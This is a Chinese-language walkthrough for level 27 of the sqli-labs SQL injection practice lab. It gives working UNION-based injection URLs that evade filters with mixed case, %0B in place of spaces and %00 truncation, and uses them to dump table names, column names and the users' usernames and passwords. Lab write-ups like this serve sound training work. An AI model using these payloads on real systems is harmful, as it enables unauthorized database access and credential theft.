---
title: Less - 27
date: 2023-03-16T13:30:43Z
lastmod: 2023-03-16T14:39:52Z
---

# Less - 27

---

# 通关教程

---

## 1、判断闭合

---

查看源码，可以看到该关卡的代码，如下

​![image](assets/image-20230316133326-5hw59r3.png)​

SQL的查询语句如下

​![image](assets/image-20230316142538-s1felln.png)​

为单引号字符型注入

---

## 2、查看当前数据库

---

```bash
http://192.168.225.132/sqli-labs/Less-27/?id=0'unIon%0BSelEcT%0B1,2,database();%00
```

​![image](assets/image-20230316143045-ihr0qc3.png)​

---

## 3、查看数据表

---

```bash
http://192.168.225.132/sqli-labs/Less-27/?id=0'unIon%0BSelEcT%0B1,2,(sELect (group_concat(table_name)) from (information_schema.tables) where (table_schema='security'));%00
```

​![image](assets/image-20230316143236-yjnzm8z.png)​

---

## 4、查看users表下的所有字段

---

```bash
http://192.168.225.132/sqli-labs/Less-27/?id=0'unIon%0BSelEcT%0B1,2,(sELect (group_concat(column_name)) from (information_schema.columns) where (table_name='users'));%00
```

​![image](assets/image-20230316143818-31fqumw.png)​

---

## 5、查看username,password字段的值

---

```bash
http://192.168.225.132/sqli-labs/Less-27/?id=0'unIon%0BSelEcT%0B1,2,(sELect (group_concat(username,password)) from (security.users));%00
```

​![image](assets/image-20230316143943-x9th91w.png)​

‍
